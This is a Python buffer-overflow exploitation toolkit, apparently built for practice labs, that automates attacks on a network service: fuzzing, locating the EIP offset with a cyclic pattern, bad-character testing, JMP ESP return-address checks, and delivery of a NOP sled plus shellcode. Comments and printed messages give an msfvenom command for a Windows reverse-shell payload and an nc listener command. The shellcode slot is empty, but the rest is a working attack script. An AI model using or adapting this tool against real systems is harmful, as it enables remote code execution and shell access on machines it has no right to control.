#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Special thanks to Philippe Grégoire's exploit-patterns. https://pypi.org/project/exploit-patterns

Examples:
python3 bufferoverflow.py 10.0.0.1 -p 1337 -m fuzzer --prefix 'OVERFLOW1 ' -f 100
python3 bufferoverflow.py 10.0.0.1 -p 1337 -m offset --prefix 'OVERFLOW1 ' -o 700
python3 bufferoverflow.py 10.0.0.1 -p 1337 -m badchar --prefix 'OVERFLOW1 ' -o 655 -b '\x00\x01\x02'
python3 bufferoverflow.py 10.0.0.1 -p 1337 -m findjump --prefix 'OVERFLOW1 ' -o 655 -b '\x00\x01\x02' -j '\xaf\x11\x50\x62'
python3 bufferoverflow.py 10.0.0.1 -p 1337 -m exploit --prefix 'OVERFLOW1 ' -o 655 -b '\x00\x01\x02' -j '\xaf\x11\x50\x62'
"""

import socket
import time
import sys
import argparse
import re
import codecs

# Set Exploit Code here:
# Run: msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=53 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x01\x02"
exploit_code = ("")

def get_args():
    parser = argparse.ArgumentParser(prog="bufferoverflow.py",
        formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
        epilog= '''
        This script will perform steps to fuzz, validate, identify, and exploit a Buffer Overflow
        vulnerability. Options: fuzzer, offset, offsetfind, badchar, findjump, exploit
        ''')
    parser.add_argument("target", help="IP target (ex: 10.0.0.1)")
    parser.add_argument("-p", "--port", default="1337", help="Target Port to perform Buffer Overflow (default = 1337)")
    parser.add_argument("-m", "--mode", default="fuzzer", help="The Buffer Overflow mode. Options: fuzzer, offset, offsetfind, badchar, findjump, exploit (default = fuzzer)")
    parser.add_argument("-pr", "--prefix", default="OVERFLOW1 ", help="The prefix to service (default = 'OVERFLOW1 ')")
    parser.add_argument("-f", "--fuzzer", default="100", help="Fuzzer incremenet value (default = 100)")
    parser.add_argument("-o", "--offset", default="0", help="The identified offset")
    parser.add_argument("-of", "--offsetfind", default="", help="Find offset")
    parser.add_argument("-b", "--badchars", default="\x00", help="The identified bad characters")
    parser.add_argument("-j", "--jmpretrn", default="", help="The identified jump return address")
    parser.add_argument("-fi", "--filler", default="", help="NOT IMPLEMENTED - Set Filler value for buffer payload")
    parser.add_argument("-r", "--recieve", default="1", help="NOT IMPLEMENTED - Disable/Enable initial receive data on socket")
    args = parser.parse_args()
    return args

def interp(target, port, mode, prefix, fuzzer, offset, offsetfind, badchars, jmpretrn):
    print("\nOPTIONS:")
    print("Target: "+ target + " Port: " + port + "\nMode: "+ mode)
    try:
        if str(mode).lower() == 'fuzzer':
            print("Prefix: "+ prefix + " Fuzzer Incremental Value: "+ fuzzer + "\n")
            fuzzer_function(target, int(port), prefix, int(fuzzer))
        elif str(mode).lower() == 'offset':
            print("Prefix: "+ prefix + " Offset: "+ offset)
            offsetfinder(target, int(port), prefix, int(offset))
        elif str(mode).lower() == 'offsetfind':
            print("This is currently broken, use 'msf-pattern_offset -l {} -q <bytes covering EIP>', on your machine.".format(offeset))
            #offsetverifier(int(offset), offsetfind)
        elif str(mode).lower() == 'badchar':
            print("Prefix: "+ prefix + " Offset: "+ offset + " Badchars: "+ badchars)
            badchars_function(target, int(port), prefix, int(offset), badchars)
        elif str(mode).lower() == 'findjump':
            print("Prefix: "+ prefix + " Offset: "+ offset + " Badchars: "+ badchars + " jmpretrn: "+ jmpretrn)
            findjump_function(target, int(port), prefix, int(offset), badchars, jmpretrn)
        elif str(mode).lower() == 'exploit':
            print("Prefix: "+ prefix + " Offset: "+ offset + " Badchars: "+ badchars + " jmpretrn: "+ jmpretrn)
            exploit_fuction(target, int(port), prefix, int(offset), badchars, jmpretrn)
        else:
            print("No valid mode choosen.\nOPTIONS: fuzzer, offset, badchar, findjump, exploit.")
    except:
        raise

def fuzzer_function(target, port, prefix, fuzzer):
    fuzz = prefix + 'A' * fuzzer
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((target, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(fuzz) - len(prefix)))
                s.send(bytes(fuzz + "\n", "latin-1"))
                s.recv(1024)
        except:
            print("Fuzzing crashed at {} bytes".format(len(fuzz) - len(prefix)))
            sys.exit(0)
        fuzz += fuzzer * "A"
        time.sleep(1)

def payloadsender(target, port, buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        s.recv(1024)
        print("\n[+] Sending buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        s.close()
        print("Done!")
    except:
        print("\nCould not connect to {}.".format(ip))
        sys.exit(0)

def default_sets():
    return [
        [chr(ord('A') + i) for i in range(26)],
        [chr(ord('a') + i) for i in range(26)],
        [chr(ord('0') + i) for i in range(10)],
    ]

def __create(length, sets):
    i = [0, 0, 0]
    l = 0
    while True:
        for o in range(len(sets)):
            yield sets[o][i[o]]
        l += len(sets)
        if l >= length:
            break
        o = -1
        i[o] += 1
        while i[o] == len(sets[o]):
            i[o] = 0
            i[o - 1] += 1
            o -= 1

def mult(ls):
    p = 0
    for i in ls:
        p = (i * (1 if not p else p))
    return p

def pattern_create(length=-1, sets=None):
    if not sets:
        sets = default_sets()
    assert(3 == len(sets))
    limit = mult([len(sets[i]) for i in range(len(sets))] + [len(sets)])
    if 0 > length:
        length = limit
    assert(limit >= length)
    return ''.join(__create(length, sets))[:length]

def pattern_offset(string, o_length=-1, sets=None):
    if not sets:
        sets = default_sets()
    assert(3 == len(sets))
    s = pattern_create(length=o_length, sets=sets)
    if string in s:
        return s.index(string)
    return -1

def offsetfinder(target, port, prefix, offset):
    if offset > 0:
        offsetpayload = pattern_create(offset)
        buffer = prefix + offsetpayload 
        payloadsender(target, port, buffer)
        print("\nUse msf-pattern_offset -l {} -q <what is covering EIP>".format(offset))
    else:
        print("\nSet an offset! (example: -o 700)")
        sys.exit(0)

def offsetverifier(offset, offsetfind):
    if offsetfind != "":
        result = pattern_offset(offsetfind, offset)
        print("\nThe Offset is " + str(result))
    else:
        print("\nAdd the output of offset mode (example: -o 700 -of 76413176)")
        sys.exit(0)

def badchars_function(target, port, prefix, offset, badchars):
    char_payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    for n in [badchars[i:i+4] for i in range(0, len(badchars), 4)]:
        print("\nRemoving: " + str(n.encode('UTF-8')))
        char_payload = re.sub(r'[{}]+'.format(n),'', char_payload)
    print("\nSending Char Payload: ")
    print('\\'.join([hex(ord(x))[1:] for x in char_payload]))
    overflow = 'A' * offset + 'B' * 4
    buffer = prefix + overflow + char_payload
    payloadsender(target, port, buffer)
    print("\nOnce you find all the bad characters you can use mona to find a jpm esp pointer:")
    print("!mona jmp -r esp -cpb \"\\x00\\x20\"")

def findjump_function(target, port, prefix, offset, badchars, jmpretrn):
    if len(jmpretrn.encode("latin1").decode("unicode_escape")) == 4:
        print("\nIf you don't have a jmpretrn pointer address use mona in Immunity Debugger:")
        print("!mona jmp -r esp -cpb \"\\x00\\x20\"")
        print("Use an address that has ASLR, Rebase, and SafeSEH protections disabled.")
        print("Insert little endian version (example: If jump address is '0201' add -j '\\x01\\x02')")
        print("Set a breakpoint on jump address and ensure that it jumps to the address.\n")
        overflow = 'A' * offset + jmpretrn.encode("latin1").decode("unicode_escape")
        buffer = prefix + overflow + 'C' * 8
        payloadsender(target, port, buffer)
    else:
        print("\n Jump Return address given is not the size of 4. (example: -j '\\x00\\x01\\x02\\x03')")

def exploit_fuction(target, port, prefix, offset, badchars, jmpretrn):
    if exploit_code == "":
        print("\nYou need to create the exploit code and modify this script!")
        print("Use: msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=53 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x21\\x38\"")
    else:
        print("Sending exploit code. Make sure to have a listener! (example: rlwrap nc -nlvp 53)")
        overflow = 'A' * offset + jmpretrn.encode("latin1").decode("unicode_escape")
        buffer = prefix + overflow + "\x90" * 16 + exploit_code
        payloadsender(target, port, buffer)

def main():
    print("""
__________        _____  _____            ________                      _____.__                 
\\______   \\__ ___/ ____\\/ ____\\___________\\_____  \\___  __ ____________/ ____\\  |   ______  _  __
 |    |  _/  |  \\   __\\\\   __\\/ __ \\_  __ \\/   |   \\  \\/ // __ \\_  __ \\   __\\|  |  /  _ \\ \\/ \\/ /
 |    |   \\  |  /|  |   |  | \\  ___/|  | \\/    |    \\   /\\  ___/|  | \\/|  |  |  |_(  <_> )     / 
 |______  /____/ |__|   |__|  \\___  >__|  \\_______  /\\_/  \\___  >__|   |__|  |____/\\____/ \\/\\_/  
        \\/                        \\/              \\/          \\/                                 
        """)
    print('                      Buffer Overflow Basic Toolkit created by Gustavo Bobbio-Hertog (defendergb)\n')
    args = get_args()
    interp(args.target.strip(), args.port, args.mode.strip(), args.prefix, args.fuzzer, args.offset.strip(), args.offsetfind.strip(), args.badchars, args.jmpretrn)

main()